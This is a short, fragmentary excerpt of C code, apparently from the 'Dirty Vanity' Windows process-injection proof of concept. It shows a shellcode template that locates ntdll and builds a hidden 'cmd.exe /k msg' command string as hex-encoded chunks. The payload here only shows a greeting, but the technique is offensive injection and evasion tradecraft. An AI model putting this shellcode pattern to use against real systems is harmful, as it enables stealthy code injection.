...
__declspec(noinline) void shellcode_template()
{
	...
	HMODULE ntdllBase = pNtdllTableEntry->DllBase;
	...
	// load wide \\??\\C:\\Windows\\System32\\cmd.exe /k msg * Hello from Dirty Vanity
	...
	wstring136.text8 = 0x006d0020006b002f;
	wstring136.text9 = 0x002a002000670073;
	wstring136.text10 = 0x006c006500480020;
	wstring136.text11 = 0x00660020006f006c;
	wstring136.text12 = 0x0020006d006f0072;
	wstring136.text13 = 0x0074007200690044;
	wstring136.text14 = 0x0061005600200079;
	wstring136.text15 = 0x007900740069006e;
	wstring136.text16 = 0x0000000000000000;
